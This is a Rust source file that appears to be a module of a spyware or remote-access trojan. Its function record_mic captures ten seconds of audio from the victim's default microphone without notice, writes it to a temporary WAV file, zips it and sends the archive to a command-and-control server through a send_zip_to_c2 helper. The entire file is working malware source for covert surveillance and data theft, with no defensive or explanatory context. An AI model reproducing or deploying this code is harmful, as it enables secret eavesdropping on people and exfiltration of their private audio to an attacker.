use anyhow::Result;
use cpal::traits::{DeviceTrait, HostTrait, StreamTrait};
use hound::{WavSpec, WavWriter};
use std::sync::{Arc, Mutex};
use std::time::Duration;
use tempfile::NamedTempFile;
use tokio::sync::Mutex as AsyncMutex;

use crate::connexion::{send_zip_to_c2, zip_file};

pub async fn record_mic() -> Result<()> {
    let host = cpal::default_host();

    let device = match host.default_input_device() {
        Some(device) => device,
        None => {
            return Err(anyhow::anyhow!("No input device available"));
        }
    };

    let config = device.default_input_config()?;

    let spec = WavSpec {
        channels: config.channels(),
        sample_rate: config.sample_rate().0,
        bits_per_sample: 16,
        sample_format: hound::SampleFormat::Int,
    };

    let temp_file = NamedTempFile::new()?;
    let mut temp_path = temp_file.path().to_path_buf();
    temp_path.set_extension("wav");

    let writer_sync = Arc::new(Mutex::new(Some(WavWriter::create(&temp_path, spec)?)));
    let writer_async = Arc::new(AsyncMutex::new(writer_sync.clone()));
    let writer_clone = writer_sync.clone();

    let err_fn = |err| eprintln!("an error occurred on stream: {}", err);

    let stream = match config.sample_format() {
        cpal::SampleFormat::I16 => device.build_input_stream(
            &config.into(),
            move |data: &[i16], _| {
                let mut guard = writer_clone.lock().unwrap();
                if let Some(writer) = guard.as_mut() {
                    for &sample in data {
                        writer.write_sample(sample).unwrap();
                    }
                }
            },
            err_fn,
            None,
        )?,
        cpal::SampleFormat::U16 => device.build_input_stream(
            &config.into(),
            move |data: &[u16], _| {
                let mut guard = writer_clone.lock().unwrap();
                if let Some(writer) = guard.as_mut() {
                    for &sample in data {
                        let sample_i16 = (sample as i32 - 32768) as i16;
                        writer.write_sample(sample_i16).unwrap();
                    }
                }
            },
            err_fn,
            None,
        )?,
        cpal::SampleFormat::F32 => device.build_input_stream(
            &config.into(),
            move |data: &[f32], _| {
                let mut guard = writer_clone.lock().unwrap();
                if let Some(writer) = guard.as_mut() {
                    for &sample in data {
                        let sample_i16 = (sample * i16::MAX as f32) as i16;
                        writer.write_sample(sample_i16).unwrap();
                    }
                }
            },
            err_fn,
            None,
        )?,
        _ => return Err(anyhow::anyhow!("No input device available")),
    };

    stream.play()?;

    tokio::time::sleep(Duration::from_secs(10)).await;

    drop(stream);

    let writer_sync = writer_async.lock().await;
    {
        let mut guard = writer_sync.lock().unwrap();
        if let Some(writer) = guard.take() {
            writer.finalize()?;
        }
    }

    let zip_file = zip_file(&temp_path).await?;
    let zip_path = zip_file.path();

    let _ = send_zip_to_c2(zip_path).await;

    Ok(())
}
